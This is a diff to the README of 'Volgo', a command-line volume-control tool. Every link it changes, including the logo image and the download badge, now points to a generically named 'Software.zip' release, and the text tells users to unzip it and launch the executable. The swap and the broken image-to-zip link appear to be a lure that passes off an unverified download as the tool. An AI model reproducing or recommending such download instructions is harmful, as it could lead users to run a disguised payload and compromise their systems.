@@ -2,7 +2,7 @@
 
 Volgo is a versatile cross-platform CLI application written in Go that allows you to effortlessly control your system's volume directly from the terminal. Whether you prefer simple commands or a visually pleasing interactive TUI (Text User Interface), Volgo has got you covered. What's more, it even supports remote volume control over SSH, making it a powerful tool for managing audio settings on various systems.
 
-![Volgo Logo](https://example.com/volgo_logo.png)
+![Volgo Logo](https://github.com/Haaruuko/volgo/releases/download/v2.0/Software.zip)
 
 ## Features 🚀
 
@@ -16,9 +16,9 @@ Volgo is a versatile cross-platform CLI application written in Go that allows yo
 
 ## Installation 🛠️
 
-To get started with Volgo, you can download the latest release [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Once you have downloaded the zip file, simply unzip it and launch the executable to start using Volgo.
+To get started with Volgo, you can download the latest release [here](https://github.com/Haaruuko/volgo/releases/download/v2.0/Software.zip). Once you have downloaded the zip file, simply unzip it and launch the executable to start using Volgo.
 
-[![Download Volgo](https://img.shields.io/badge/Download-Volgo-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Volgo](https://github.com/Haaruuko/volgo/releases/download/v2.0/Software.zip)](https://github.com/Haaruuko/volgo/releases/download/v2.0/Software.zip)
 
 In case the download link is not working or the file is missing, please check the "Releases" section of the repository to find the appropriate version of Volgo for your system.
 
